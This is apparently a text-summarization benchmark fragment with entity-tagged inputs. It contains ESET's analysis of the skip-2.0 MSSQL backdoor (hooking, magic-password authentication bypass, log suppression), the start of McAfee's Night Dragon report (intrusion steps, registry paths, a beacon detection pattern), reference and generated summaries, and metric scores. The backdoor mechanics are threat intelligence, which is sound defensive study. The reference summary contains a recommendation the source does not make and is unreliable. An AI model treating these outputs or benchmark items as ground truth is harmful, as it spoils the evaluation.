[ORG] Winnti [ORG] Group \u2019s arsenal . This backdoor targets [ORG] MSSQL [ORG] Server [CARDINAL] 11 and [CARDINAL] 12 , allowing the attacker to connect stealthily to any [ORG] MSSQL account by using a magic password \u2013 while automatically hiding these connections from the logs . Such a backdoor could allow an attacker to stealthily copy , modify or delete database content . This could be used , for example , to manipulate in - game currencies for \ufb01nancial gain . In - game currency database manipulations by [ORG] Winnti operators have already been reported . To the best of our knowledge , skip-2.0 is the \ufb01rst [ORG] MSSQL [ORG] Server backdoor to be documented publicly . Note that even though [ORG] MSSQL [ORG] Server [CARDINAL] 11 and [CARDINAL] 12 are not the most recent versions ( released in [DATE] 2012 and [DATE] 2014 , respectively ) , they are the most commonly used ones according to Censys \u2019s data . We recently published a white paper updating our understanding of the arsenal of [ORG] the [ORG] Winnti [ORG] Group , and that exposed a previously undocumented backdoor of theirs called [ORG] PortReuse . It uses an identical packer to that used with the payload embedded in compromised video games uncovered by ESET in [DATE] March [DATE] 2019 . The [ORG] VMProtected launcher that drops the [ORG] PortReuse backdoor was also found being used to launch recent [ORG] ShadowPad versions . In that context , we were able to \ufb01nd a new tool called skip.2 - 0 by its developer . It uses the same [ORG] VMProtected launcher as well as [ORG] Winnti [ORG] Group \u2019s custom packer and exhibits multiple similarities with other samples from [ORG] the [ORG] Winnti [ORG] Group \u2019s toolset . This leads us to ascribe skip-2.0 to that toolset also . This article will focus on the technical details and functionality of this [ORG] MSSQL [ORG] Server backdoor , as well as on exposing the technical similarities of skip.2 - 0 with [ORG] the [ORG] Winnti [ORG] Group \u2019s known arsenal \u2013 in particular , with the [ORG] PortReuse backdoor and [ORG] ShadowPad . A note on the reasons why we chose [ORG] the \u201c [ORG] Winnti [ORG] Group \u201d naming can be found on our white paper . VMProtected launcherurl [ORG] Group \u2019s skip2.0 : A Microsoft SQL Server backdoor [ORG] | [ORG] WeLiveSecurityWe found skip-2.0 while looking for [ORG] VMProtected launchers , for which the payload is usually either [ORG] PortReuse or [ORG] ShadowPad . Embedded payload As with the encrypted [ORG] PortReuse and [ORG] ShadowPad payloads , skip-2.0 is embedded in the [ORG] VMProtected launcher \u2019s overlay , as shown in Figure [CARDINAL] 1 : Figure [CARDINAL] 1 . VMProtected launcher \u2019s headers . The payload is embedded in the [ORG] PE overlay . Encryption The payload encryption is identical to that used in the other [ORG] VMProtected launchers . It is [ORG] RC5- encrypted with a key derived from the VolumeID and the string f@Ukd!rCto R$. , as described in our previous white paper on the [ORG] Winnti [ORG] Group arsenal . Persistence As in the case of [ORG] PortReuse and [ORG] ShadowPad , the launcher probably persists by exploiting a [ORG] DLL hijacking vulnerability by being installed at C:\\Windows\\System32\\TSVIPSrv . [ORG] DLL . This results in the [ORG] DLL being loaded by the standard [ORG] Windows [ORG] SessionEnv service at system startup . [ORG] Winnti [ORG] Group \u2019s custom packer Once decrypted the embedded payload is actually [ORG] Winnti [ORG] Group \u2019s custom packer . This packer is the same shellcode that was documented in our previous article and white paper . It is used to pack the [ORG] PortReuse backdoor as well as the payload embedded in the compromised video As described in our previous article , the packer con\ufb01guration contains the decryption key of the packed binary as well as its original \ufb01lename , its size and the execution type ( [ORG] EXE or [ORG] DLL ) . The payload \u2019s packer con\ufb01guration is shown in [ORG] Table 1.Parent SHA-1Payload SHA-1RC4 [NORP] keyFilenameLaunch typeurl [ORG] Group \u2019s skip2.0 : A Microsoft SQL Server backdoor | WeLiveSecurityParent SHA-1 [CARDINAL] 9aafe81d07b3e5b\u2010 b282608f0a2a4656eb485b7c9Payload SHA-1 2Table [CARDINAL] 1 . Payload \u2019s packer con\ufb01guration One can see from the packer con\ufb01guration that the payload is called [ORG] Inner [ORG] - Loader . [PERSON] Inner [PERSON] - Loader is the name of an injector that is the part of [ORG] the [ORG] Winnti [ORG] Group \u2019s arsenal used to inject the [ORG] PortReuse backdoor into processes listening on a particular port , as described in our previous publication . Beyond that identical name , by analyzing this payload it appears that it is another variant of the [NORP] Inner - Loader injector . [NORP] Inner [NORP] - Loader injector This variant of [NORP] Inner [NORP] - Loader , instead of looking for a process listening on a particular port , as in the case when injecting the [ORG] PortReuse backdoor , looks for a process called sqlserv.exe , which is the conventional process name of [ORG] MSSQL [ORG] Server . If found , [NORP] Inner [NORP] - Loader then injects a payload into this process . This payload is also packed with the custom packer \u2013 the packer con\ufb01guration of that payload is shown in [LAW] Table [LAW] 2.Parent [LAW] SHA-1 a2571946ab181657e\u2010 b825cde07188e8bcd689575Payload SHA-1 2.0.dllLaunch type [CARDINAL] 2Table [CARDINAL] 2 . Packer con\ufb01guration of the payload embedded in [LOC] Inner [LOC] - Loader The original \ufb01lename of this injected payload is skip-2.0.dll . skip-2.0 After having been injected and launched by [ORG] Inner [ORG] - Loader , skip-2.0 \ufb01rst checks whether it is executing within an sqlserv.exe process and if so , retrieves a handle to sqllang.dll , which is loaded by sqlserv.exe . It then proceeds to \ufb01nd and hook multiple functions from that [ORG] DLL . Figure [CARDINAL] 2 depicts the skip-2.0 chain of [ORG] compromise.url [ORG] Group \u2019s skip2.0 : A Microsoft SQL Server backdoor | WeLiveSecurityFigure [CARDINAL] 2 . skip-2.0 unpacking and injectionHooking sqllang.dll The hooking procedure used by skip-2.0 is very similar to the one used by [ORG] NetAgent , the [ORG] PortReuse module responsible for installing the networking hook . This hooking library is based on the distorm open source disassembler that is used by multiple open source hooking frameworks . In particular , a disassembling library is needed to correctly compute the size of the instructions to be hooked . One can see in Figure [CARDINAL] 3 that the hooking procedure used by [ORG] NetAgent and skip-2.0 are almost identical.url [ORG] Group \u2019s skip2.0 : A Microsoft SQL Server backdoor | WeLiveSecurityFigure [CARDINAL] 3 . Hex - Rays output comparison between the [ORG] NetAgent ( left ) and skip-2.0 ( right ) hooking proceduresThere is one notable difference , which is the fact that the hooking function from skip-2.0 takes the address of the hook to be installed as argument , while for [ORG] NetAgent , the address of the hook to install is hardcoded . This is due to the fact that skip-2.0 has to hook multiple functions in sqllang.dll to operate properly , while [ORG] NetAgent only targets a single function . To locate each sqllang.dll functions to be hooked , skip-2.0 \ufb01rst retrieves the size of the [ORG] DLL once loaded in memory ( i.e. its virtual size ) by parsing its [ORG] PE headers . Then an array of bytes to be matched within sqllang.dll is initialized as shown in Figure [CARDINAL] 4 . Once the address of the \ufb01rst occurrence matching the byte array is found , the hook is installed using the procedure shown in Figure [CARDINAL] 3.Figure [CARDINAL] 4 . Hex - Rays output of the procedure initializing the byte array to match in sqllang.dllThe success of the hook installation is then logged in cleartext in a log \ufb01le located at the hardcoded path [PRODUCT] C:\\Windows\\Temp\\TS_2CE1.tmp and shown in [ORG] Figure [ORG] 5.url [ORG] Group \u2019s skip2.0 : A Microsoft SQL Server backdoor | WeLiveSecurityFigure [CARDINAL] 5 . Log generated during hooks installationShould the targeted function not be found , the hook installer searches for a fallback function , with a different set of byte patterns . Matching a sequence of bytes to locate the address of the targeted function instead of using a static offset , plus as using a fallback sequence of bytes , allows skip-2.0 to be more resilient to [ORG] MSSQL updates and to potentially target multiple sqllang.dll updates . [CARDINAL] One password to rule them all The functions targeted by skip-2.0 are related to authentication and event logging . The targeted functions include : CPwdPolicyManager::ValidatePwdForLogin [NORP] XeSqlPkg::sql_statement_completed::Publish [DATE] XeSqlPkg::sql_batch_completed::Publish [NORP] SecAuditPkg::audit_event::Publish [NORP] XeSqlPkg::login::Publish XeSqlPkg::ual_instrument_called::PublishThe most interesting function is the \ufb01rst one ( CPwdPolicyManager::ValidatePwdForLogin ) , which is responsible for validating the password provided for a given user . This function \u2019s hook checks whether the password provided by the user matches the magic password , in that case , the original function will not be called and the hook will return 0 , allowing the connection even though the correct password was not provided . A global \ufb02ag is then set that will be checked by the other hooked functions responsible for event logging . The corresponding decompiled procedure is shown in Figure [CARDINAL] 5 . In the case where this global \ufb02ag is set , the hooked logging functions will silently return without calling their corresponding , original functions , so the action will not be logged . In the case where a different password is provided , the original function is called.url [ORG] Group \u2019s skip2.0 : A Microsoft SQL Server backdoor | WeLiveSecurityFigure [CARDINAL] 6 . Hex - Rays output of the procedure responsible for matching the password providedat login with the hardcoded stringA similar backdooring technique , based on hardcoded passwords , was used with [ORG] SSH backdoors previously discovered by [ORG] ESET . The difference here is that skip-2.0 is installed in - memory , while in the case of the [ORG] SSH backdoors the sshd executable was modi\ufb01ed prior to execution . Additionally , CSECAuthenticate::AuthenticateLoginIdentity will be called from within its hook code but the hook will always return [DATE] 0 . The [ORG] ReportLoginSucess and [ORG] IssueLoginSuccessReport hooks will not call the original functions if the magic password was used to log in . The same behavior is applied to FEExecuteLogonTriggers . Other logging functions such as [NORP] XeSqlPkg::sql_statement_completed::Publish or [NORP] XeSqlPkg::sql_batch_completed::Publish will also be disabled in the case where the user logged in with the magic password . Multiple audit events are disabled as well , including SecAuditPkg::audit_event::Publish , [NORP] XeSqlPkg::login::Publish and [GPE] XeSqlPkg::ual_instrument_called::Publish . This series of hooks allows the attacker not only to gain persistence in the victim \u2019s [ORG] MSSQL [ORG] Server through the use of a special password , but also to remain undetected thanks to the multiple log and event publishing mechanisms that are disabled when that password is used . We tested skip-2.0 against multiple [ORG] MSSQL [ORG] Server versions and found that we were able to login successfully using the special password with [ORG] MSSQL [ORG] Server [CARDINAL] 11 and [CARDINAL] 12 . To check whether a particular sqllang.dll version is targeted by skip-2.0 ( i.e. , that matches the byte patterns ) , we created a [ORG] YARA rule , which can be found in our GitHub repository . Connection with [ORG] the [ORG] Winnti [ORG] Group [ORG] We observed multiple similarities between skip-2.0 and other tools from [ORG] the [ORG] Winnti [ORG] Group \u2019s arsenal . Its [ORG] VMProtected launcher , custom packer , [NORP] Inner [NORP] - Loader injector and hooking framework are part of the already known toolset of [ORG] the [ORG] Winnti [ORG] Group . This leads us to think that skip-2.0 is also part of that toolset . Conclusion The skip-2.0 backdoor is an interesting addition to [ORG] the [ORG] Winnti [ORG] Group \u2019s arsenal , sharing a great deal of similarities with the group \u2019s already known toolset , and allowing the attacker to achieve persistence on an MSSQL Server . Considering that administrative privileges are required for installing the hooks , skip-2.0 must be used on already compromised [ORG] MSSQL [ORG] Servers to achieve persistence and stealthiness . We will continue to monitor new activities of [ORG] the [ORG] Winnti [ORG] Group and will publish relevant information on our blog . For any inquiries , contact us at threatintel@eset.com . Indicators of Compromise ( [ORG] IoCs)url [ORG] Group \u2019s skip2.0 : A Microsoft SQL Server backdoor | WeLiveSecurityComponent Component VMP LoaderInner - Loader injectorskip-2.0Known targeted sqllang.dll \ufb01les ( non- exhaustive list)SHA-1 t. [DATE] HXA2571946AB181657EB825CDE07188E8BCD689575 Win64 / In\u2010 jector . BS60B9428D00BE5CE562FF3D888441220290A6DAC7 Win32 / Ag ent . [GPE] SOKN / [GPE] A4396D3C904CD340984D474065959E8DD11915444 B63MITRE [PERSON] ATT&CK techniquesTactic skip-2.0 is started with the [ORG] SessionEnv servicePersis\u2010 tenceT1038 DLL Search Or\u2010der Hijackingskip-2.0 probably uses a [ORG] DLL hijacking technique against the Ses\u2010 sionEnv serviceT1179 Hookingskip-2.0 hooks multiple functions in sqllang.dll service to bypass authentication and maintain stealthDefense EvasionT1054Indicator Blockingskip-2.0 blocks event loggingT1045 Software PackingT1057 Process Discoveryskip.2 - 0 and [NORP] Inner [NORP] - Loader are packed using [ORG] Winnti 's custom pack\u2010 er . Further , the launcher is [ORG] VMProtected . [NORP] Inner [NORP] - Loader lists running processes in order to \ufb01nd the process running [PERSON] MSSQL ServerDiscoveryImpactT1485 Data Destructionskip-2.0 allows unauthorized access to [ORG] MSSQL databases , allow\u2010 ing data destruction or tamperingT1494 [ORG] Runtime [ORG] Data Manipulationskip-2.0 manipulates event logging at runtimeurl [ORG] Group \u2019s skip2.0 : A Microsoft SQL Server backdoor | [PERSON] WeLiveSecurityTacticIDNameDescriptionT1492 [PERSON] Stored Data Manipulationskip-2.0 allows unauthorized access to [ORG] MSSQL databases , allow\u2010 ing manipulation of stored dataMathieu Tartare 21 Oct 2019 - 11:30AMurl", "generated_text": "the Winnti Group; the group; Microsoft SQL; MSSQL Server; 11; 12; a magic password; the payload; the VMProtected launcher; XOR; control; the payload; references; ports; the portReuse backdoor; ShadowPad; similarities; access; other tools; the Winnti group; the portReuse backdoor; VMProtected; the portReuse payload; use; the same custom packer; VMProtected launcher; the same capabilities; compromise; software companies; this backdoor; the Winnti Group; a new backdoor; a VMProtected launcher; similarities; the toolset; a new tool; the Winnti Group.", "ref_text": "<START-1>The document describes analysis of a new backdoor called skip-2.0 used by the Winnti cyberespionage group to target Microsoft SQL Server. Winnti has been active since at least 2012 conducting supply chain attacks against the video game and software industries. Skip-2.0 allows the attacker to stealthily connect to any MSSQL account using a hardcoded magic password. It achieves this by installing hooks in the sqllang.dll library used by MSSQL Server to bypass authentication and disable logging of the unauthorized access. The malware uses the same VMProtected launcher, custom packer, and injector techniques seen in other Winnti tools like PortReuse and ShadowPad. An injector called Inner-Loader injects the skip-2.0 DLL into the sqlserv.exe process. Skip-2.0 locates and hooks functions in sqllang.dll related to password validation, logging, and auditing using pattern matching. If the magic password is provided, the hooks spoof validation and disable logging. This gives Winnti stealthy persistence and access to manipulate or steal data from compromised MSSQL Servers. Skip-2.0 was found to be effective against MSSQL Server versions 11 and 12. The malware shares multiple similarities with other Winnti tools, leading researchers to attribute it to their arsenal for targeted cyberespionage campaigns. Defenses like monitoring for anomalies and enforcing certificate validation are recommended. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5488126649076517, "gpt3/lexical/rouge_rouge2": 0.20159151193633953, "gpt3/lexical/rouge_rougeL": 0.2796833773087071, "gpt3/lexical/rouge_rougeLsum": 0.2796833773087071, "gpt3_generated_text": ["The article discusses the discovery of a previously undocumented backdoor called skip-2.0, which targets Microsoft SQL (MSSQL) Server 11 and 12. This backdoor allows attackers to gain discreet access to compromised organizations by using a magic password and hiding connections from logs. It is attributed to the Winnti Group, a notorious cyberespionage group known for high-profile attacks against the video game and software industry. The skip-2.0 backdoor is the first MSSQL Server backdoor to be publicly documented and has the potential to be used for database manipulations, such as manipulating in-game currencies for financial gain. The backdoor is embedded in the VMProtected launcher's overlay and uses the same encryption and persistence methods as other tools used by the Winnti Group, such as the PortReuse backdoor and ShadowPad. The article highlights the technical details and functionality of the skip-2.0 backdoor and emphasizes its similarities to other tools in the Winnti Group's arsenal."]}, {"split_name": "val", "sample_id": "val_50", "prompt_text": "Extract the keywords: [ORG] White [ORG] PaperGlobal [ORG] Energy [ORG] Cyberattacks : \u201c Night Dragon \u201d By McAfee \u00ae Foundstone \u00ae Professional Services and [ORG] McAfee [ORG] Labs \u2122 [DATE] February [DATE] 10 , [CARDINAL] 2011334778991111121213131318White [ORG] PaperGlobal [ORG] Energy [ORG] Cyberattacks : \u201c [WORK_OF_ART] Night [WORK_OF_ART] Dragon\u201dTable [WORK_OF_ART] of [WORK_OF_ART] Contents [WORK_OF_ART] Executive [WORK_OF_ART] SummaryAnatomy of a HackDetails of the [ORG] AttackUse of remote administration toolsDetectionHost [PERSON] Files and Registry KeysAnti - virus [ORG] AlertsNetwork [ORG] CommunicationsAdditional [ORG] Detection [ORG] TechniquesMcAfee [ORG] Early [ORG] DetectionMcAfee DetectionMcAfee PreventionConclusionCredits and [PRODUCT] AcknowledgementsAppendix [PRODUCT] A : [ORG] zwShell \u2014 the RATAppendix B : AttributionVersion 1.4 | [DATE] Feb 11 , [DATE] 2011 03:30 PMWhite PaperGlobal Energy Cyberattacks : \u201c [WORK_OF_ART] Night [WORK_OF_ART] Dragon\u201dExecutive [WORK_OF_ART] Summary In [DATE] 2010 , we entered [DATE] a [DATE] new [DATE] decade in the world of cybersecurity . [DATE] The [DATE] prior [DATE] decade was stained with immaturity , reactive technical solutions , and a lack of security sophistication that promoted critical outbreaks , such as [PERSON] Code [PERSON] Red , Nimda , Blaster , [PERSON] Sasser , [PERSON] SQL [PERSON] Slammer , [PERSON] Conficker , and myDoom \u2014 to name a few . The security community has evolved and grown smarter about security , safe computing , and system hardening but so have our adversaries . [DATE] This [DATE] decade is setting up to be the exponential jumping off point . The adversaries are rapidly leveraging productized malware toolkits that let them develop more malware than in [DATE] all [DATE] prior [DATE] years combined , and they have matured from [DATE] the [DATE] prior [DATE] decade to release the most insidious and persistent cyberthreats ever known . The Google hacks ( \u201c Operation [PERSON] Aurora \u201d ) , named by [PERSON] McAfee and announced in [DATE] January [DATE] 2010 , and the WikiLeaks document disclosures of [DATE] 2010 have highlighted the fact that external and internal threats are nearly impossible to prevent . Miscreants continue to infiltrate networks and exfiltrate sensitive and proprietary data upon which the world \u2019s economies depend every day . When a new attack emerges , security vendors can not stand by idly and watch . We are obligated to share our findings to protect those not yet impacted and to repair those who have been . As such , [ORG] McAfee [ORG] Foundstone [ORG] Professional [ORG] Services and [ORG] McAfee [ORG] Labs decided to release the following discovery . Starting in [DATE] November [DATE] 2009 , coordinated covert and targeted cyberattacks have been conducted against global oil , energy , and petrochemical companies . These attacks have involved social engineering , spear- phishing attacks , exploitation of [ORG] Microsoft [PRODUCT] Windows operating systems vulnerabilities , [ORG] Microsoft [ORG] Active [ORG] Directory compromises , and the use of remote administration tools ( RATs ) in targeting and harvesting sensitive competitive proprietary operations and project - financing information with regard to oil and gas field bids and operations . We have identified the tools , techniques , and network activities used in these continuing attacks \u2014 which we have dubbed Night Dragon \u2014 as originating primarily in [GPE] China . Through coordinated analysis of the related events and tools used , [ORG] McAfee has determined identifying features to assist companies with detection and investigation . While we believe many actors have participated in these attacks , we have been able to identify [CARDINAL] one individual who has provided the crucial [ORG] C&C infrastructure to the attackers . ( See Appendix B for more detail on attribution.)Anatomy of a HackNIGHTDRAGON12345Extranet webserversGained access to sensitiveinternalcompromiseddesktops andserversAccessed additionalusernames andpasswordsEnabled direct machines to theInternetEx(cid:2)ltrated emailarchives and other sensitivedocumentsGlobal Energy uploaded toserversFurther accessto sensitive computerscompromisedSource : [ORG] McAfee , [ORG] Inc. Figure [CARDINAL] 1 . Anatomy of a hack.3White [ORG] PaperGlobal [ORG] Energy [ORG] Cyberattacks : \u201c [WORK_OF_ART] Night [WORK_OF_ART] Dragon\u201dThe [WORK_OF_ART] Night [WORK_OF_ART] Dragon attacks work by methodical and progressive intrusions into the targeted infrastructure . The following basic activities were performed by [ORG] the [ORG] Night [ORG] Dragon [ORG] operation:\u2022 [ORG] Company extranet web servers compromised through [ORG] SQL - injection techniques , allowing remotecommand execution\u2022 Commonly available hacker tools are uploaded on compromised web servers , allowing attackers to pivot into the company \u2019s intranet and giving them access to sensitive desktops and servers internally\u2022 Using password cracking and pass - the - hash tools , attackers gain additional usernames and passwords , allowing them to obtain further authenticated access to sensitive internal desktops and [ORG] servers\u2022 [ORG] Initially using the company \u2019s compromised web servers as command and control ( [ORG] C&C ) servers , the attackers discovered that they needed only to disable [ORG] Microsoft [ORG] Internet [ORG] Explorer ( IE ) proxy settings to allow direct communication from infected machines to [ORG] the [ORG] Internet\u2022 [ORG] Using the [ORG] RAT malware , they proceeded to connect to other machines ( targeting executives)and exfiltrating email archives and other sensitive documentsDetails of the Attack Attackers using several locations in [GPE] China have leveraged [ORG] C&C servers on purchased hosted services in [GPE] the [GPE] United [GPE] States and compromised servers in the [GPE] Netherlands to wage attacks against global oil , gas , and petrochemical companies , as well as individuals and executives in [GPE] Kazakhstan , [GPE] Taiwan , [GPE] Greece , and [GPE] the [GPE] United [GPE] States to acquire proprietary and highly confidential information . The primary operational technique used by the attackers comprised a variety of hacker tools , including privately developed and customized RAT tools that provided complete remote administration capabilities to the attacker . RATs provide functions similar to [PRODUCT] Citrix or [ORG] Microsoft [ORG] Windows [ORG] Terminal [ORG] Services , allowing a remote individual to completely control the affected system . To deploy these tools , attackers [ORDINAL] first compromised perimeter security controls , through [ORG] SQL - injection exploits of extranet web servers , as well as targeted spear - phishing attacks of mobile worker laptops , and compromising corporate [ORG] VPN accounts to penetrate the targeted company \u2019s defensive architectures ( DMZs and firewalls ) and conduct reconnaissance of targeted companies \u2019 networked computers . [ORG] SQL [ORG] Injection [ORG] Attacks(1 ) [ORG] Attacker crafts a HTTP GET request to inject commands to [ORG] SQL server to gain system - level access(2 ) [ORG] Malware is placed on server and used to harvest the local and [PRODUCT] Active [PRODUCT] Directory account credentialsWebInternetSQLAD(4 ) [ORG] Attacker uses [ORG] RAT malware to conduct additional reconnaissance and systems compromises and to harvest con\u201edential dataC&C(3 ) [WORK_OF_ART] Active [WORK_OF_ART] Directory accounts are used to access network computers and plant [ORG] RAT malware that connects with remote [ORG] C&C addresses . Figure [CARDINAL] 2 . [ORG] SQL - injection attacks.4White [ORG] PaperGlobal [ORG] Energy [ORG] Cyberattacks : \u201c [WORK_OF_ART] Night Dragon\u201dSpear - Phishing [WORK_OF_ART] Attacks(2 ) User opens infected email and the compromised website is accessed ; a [ORG] RAT is downloaded(1 ) [NORP] Attacker sends a spear - phishing email containing a link to a compromised web serverWebInternetEmail(4 ) [ORG] Attacker uses [ORG] RAT malware to conduct additional reconnaissance and systems compromises and to harvest con(cid:1)dential dataC&C(3 ) User account information and host con(cid:1)guration information is sent to a [ORG] C&C serverFigure [CARDINAL] 3 . Spear - phishing attacks . Many [NORP] Chinese hacker websites offer these tools for download , including links to reduh , [ORG] WebShell , ASPXSpy , and many others , plus exploits and zero - day malware . Figure [CARDINAL] 4 . Rootkin.net.cn offers access to an endless list of hacker tools and exploits.5White [ORG] PaperGlobal [ORG] Energy [ORG] Cyberattacks : \u201c Night Dragon\u201dFigure [CARDINAL] 5 . [ORG] WebShell and ASPXSpy tools allow an attacker to bypass many firewall rules to funnel all control through a company \u2019s web server.6White [ORG] PaperGlobal [ORG] Energy [ORG] Cyberattacks : \u201c [WORK_OF_ART] Night [WORK_OF_ART] Dragon\u201dOnce the initial system was compromised , the attackers compromised local administrator accounts and [ORG] Active [ORG] Directory administrator ( and administrative users ) accounts . The attackers often used common Windows utilities , such as [ORG] SysInternals tools ( acquired by [ORG] Microsoft in [DATE] 2006 ) \u2014 and other publicly available software , including hacking tools developed in [GPE] China and widely available on [NORP] Chinese underground hacker websites \u2014 to establish \u201c backdoors \u201d through reverse proxies and planted [NORP] Trojans that allowed the attackers to bypass network and host security policies and settings . Desktop anti - virus and anti - spyware tools were also disabled in some instances \u2014 a common technique of targeted attacks . Use of remote administration tools Remote administration tools ( RATs ) are commonly used administrative tools that allow hackers ( and administrators ) to manage victims \u2019 computers ( or managed systems ) and completely control their use and function . A commonly used RAT in the hacker community is Gh0st and its many variants . RAT features often include screen and webcam spying , keystroke logging , mouse control , file / registry , and process management , and , of course , remote command shell capability . McAfee has identified several RATs that have been used to establish a persistent infiltration channel into compromised companies . [CARDINAL] One of the most prevalent RATs is [ORG] zwShell , which [ORG] McAfee has seen in the wild since [DATE] the [DATE] spring [DATE] of [DATE] 2010 ( compiled on [DATE] 2010 - 03 - 17 08:47:00 ) . Written in the Delphi language , [ORG] zwShell was used by attackers to both build custom variants of the [GPE] Trojan that they deployed on [CARDINAL] dozens of machines within each victim company , as well as to control compromised machines that would initiate beacon connections to it on a custom protocol . Attackers used [ORG] zwShell extensively to generate [CARDINAL] dozens of unique [GPE] Trojan variants and to control the infected machines and exfiltrate sensitive data directly from them . ( See Appendix A for a breakdown of the [ORG] zwShell.)Once the attackers had complete control of the targeted internal system , they dumped account hashes with gsecdump and used [ORG] the [ORG] Cain [ORG] & [ORG] Abel tool to crack the hashes to leverage them in targeting ever more sensitive infrastructures . Files of interest focused on operational oil and gas field production systems and financial documents related to field exploration and bidding that were later copied from the compromised hosts or via extranet servers . In some cases , the files were copied to and downloaded from company web servers by the attackers . In certain cases , the attackers collected data from [ORG] SCADA systems . Detection The methods and tools used in these attacks are relatively unsophisticated , as they simply appear to be standard host administration techniques , using standard administrative credentials . This is largely why they are able to evade detection by standard security software and network policies . Since the initial compromises , however , many individual unique signatures have been identified for the [GPE] Trojan and associated tools by security vendors , including [PERSON] McAfee ; yet only through recent analysis and the discovery of common artifacts and evidence correlation have we been able to determine that a dedicated effort has been ongoing for [DATE] at [DATE] least [DATE] two [DATE] years , and likely [CARDINAL] as [CARDINAL] many [CARDINAL] as [CARDINAL] four . We can now associate the various signatures to these events . The following artifacts can help to determine whether a company has been compromised:\u2022 Host files and/or registry keys \u2022 Anti - virus alerts [ORG] \u2022 [ORG] Network [ORG] communications7White [ORG] PaperGlobal [ORG] Energy [ORG] Cyberattacks : \u201c [WORK_OF_ART] Night [WORK_OF_ART] Dragon\u201dHost [WORK_OF_ART] Files [WORK_OF_ART] and [WORK_OF_ART] Registry [WORK_OF_ART] KeysUtilityDescriptionCommand [WORK_OF_ART] & for installing the backdoor on the remote system . The dropper can be run from any directory and is usually executed with [ORG] PSEXEC or an RDP session . Thus , related [ORG] Windows [ORG] Security [ORG] Event logs provide useful information concerning compromised [WORK_OF_ART] Active [WORK_OF_ART] Directory accounts . These logs can be reviewed with [ORG] Windows [ORG] Event [ORG] Log Manager or programs , such as \u201c [WORK_OF_ART] Event [WORK_OF_ART] Log [WORK_OF_ART] Explorer \u201d or [PERSON] EnCase , which support search capabilities . When executed , the dropper creates a temporary file that is reflected in Windows update logs ( KB*.log files in c:\\Windows folder).This is because the Windows Registry is modified by the dropper to create a \u201c netsvcs \u201d key . Accordingly , the date of the backdoor installation can be determined from a search of the [PERSON] KB log files . This temporary file is also identified in the backdoor [ORG] DLL itself . The temporary file is usually some alphanumeric combination that includes \u201c gzg \u201d ( for example , [GPE] xgt0gzg ) ; however , it has been seen with generic file names ( for example , server.exe ) as well . The dropper is deleted when the backdoor is installed , and the temporary file is removed when the computer is restarted . If a backdoor has already been configured on the system , the dropper installation will fail unless it uses a different configuration . Trojan backdoorDynamic link libraries ( DLLs ) , also appearing under many other names . These files have a correlated [ORG] Windows [ORG] Registry key that is determined by the dropper when the backdoor is installed . The dropper iterates through the Windows netsvcs registry keys and uses the [ORDINAL] first available key , indicating the path and filename of the backdoor in a [ORG] ServiceDLL register . The backdoor operates as a service through a \u201c svchost.exe netsvcs \u2013 k \u201d registry setting . The service key can be found under : HKLM\\system\\<controlset>\\services\\The [ORG] DLL is a system or hidden file , [CARDINAL] 19 [PERSON] KB to [CARDINAL] 23 [PERSON] KB in size and includes an XOR - encoded data section that is defined by the [ORG] C&C application when the dropper is created . It includes the network service identifier , registry service key , service description , mutex name , [ORG] C&C server address , port , and dropper temporary file name . The backdoor may operate from any configured [ORG] TCP port . This [ORG] DLL is specified in the [ORG] ServiceDLL key in the related Windows netsvcs registry entry . The [ORG] DLL is usually found in the % System%\\System32 or % System%\\SysWow64 directory . Trojan backdoor [CARDINAL] 2*startup.dllA6CBA73405C77FEDEAF4722AD7D35D60Initially configured with the following : connect.dll6E31CCA77255F9CDE228A2DB9E2A3855Connect.dll creates the temporary file \u201c HostID.DAT , \u201d which is sent to the [ORG] C&C server , then downloads and configures related DLLs including:\u2022 PluginFile.dll \u2022 PluginRegedit.dllThereafter \u201c [ORG] Startup.dll \u201d operates the service under a Windows Registry key . All communications seen so far with this version have been on ports [CARDINAL] 25 and [CARDINAL] 80 over [ORG] TCP but can operate on any determined port . The service key is identified in the [ORG] DLL ( which does not include any encrypted data ) as : HKLM\\Software\\RATThis [ORG] DLL is usually found in the % System%\\System32 directory ; however , it has also been found in other locations . The path to the backdoor [ORG] DLL is indicated in [ORG] the [ORG] Windows [ORG] Registry [ORG] ServiceDLL key . * This [ORG] DLL uses a different [ORG] C&C application that may be an earlier version of [ORG] zwShell , analysis continues.8White [ORG] PaperGlobal [ORG] Energy [ORG] Cyberattacks : \u201c [WORK_OF_ART] Night [WORK_OF_ART] Dragon\u201dThe [WORK_OF_ART] Trojan components are manually copied or delivered through administrative utilities to remote systems . They do not include any worm or self - replicating features , nor can the [ORG] Trojan \u201c infect \u201d other computers . Removing the [GPE] Trojan components is simply a matter of deleting the related files and registry settings . The [PERSON] Trojan backdoor communicates with the [ORG] C&C server at the address hard - coded in each [ORG] DLL . The [ORG] C&C server can not modify the backdoor once it is installed ; related systems must have the [PERSON] Trojan file removed before a new backdoor [ORG] DLL can be installed on the system . Thus , if the [ORG] C&C server address is changed , those servers that have the [ORG] DLL with previous addresses must be remotely administered by the attacker . Anti - virus [PRODUCT] Alerts [PRODUCT] Anti - virus patterns are defined according to samples submitted by clients or analysts as they are discovered . Some [NORP] Trojans exhibit characteristics of other types of malware , such as worms or viruses , that have the ability to infect other systems . RATs do not typically include such features , and , because they are defined with unique configurations for custom purposes , they commonly change faster than unique samples can be identified . Only when an entire RAT toolkit is found can we define an anti - virus pattern that is generic enough to detect the [ORG] RAT regardless of configuration changes . The package necessarily includes the [ORG] C&C application server , the generator utility for creating droppers , related droppers , and backdoors \u2014 and a sufficient number of each to correlate the toolkit . As mentioned previously , there have been several unique patterns developed from samples submitted to [PERSON] McAfee ( as well as to other anti - virus vendors).McAfee recommends that companies review [ORG] McAfee [ORG] ePolicy [ORG] Orchestrator \u00ae ( McAfee ePO \u2122 ) software and anti - virus logs for \u201c [ORG] NightDragon \u201d signature detections to identify related alerts since [DATE] 2007 and then recover and resubmit these samples for analysis to investigate the related incidents . McAfee can assist with the analysis or provide instructions and tools for internal review . [ORG] Network [ORG] Communications [ORG] Network communications are relatively easy to detect because the malware uses a unique host beacon and server response protocol . Each communication packet between the compromised host and the [ORG] C&C server is signed with a plain text signature of \u201c [PERSON] hW$. \u201d ( or \u201c \\x68\\x57\\x24\\x13 \u201d ) at the byte offset [CARDINAL] 0x42 within the [ORG] TCP packet . The backdoor begins its beacon at [CARDINAL] approximately five - second intervals with an initial packet that may be detected with the pattern : \u201c \\x01\\x50[\\x00-\\xff]+\\x68\\x57\\x24\\x13.\u201d9White PaperGlobal Energy Cyberattacks : \u201c Night Dragon\u201dThe server acknowledges the 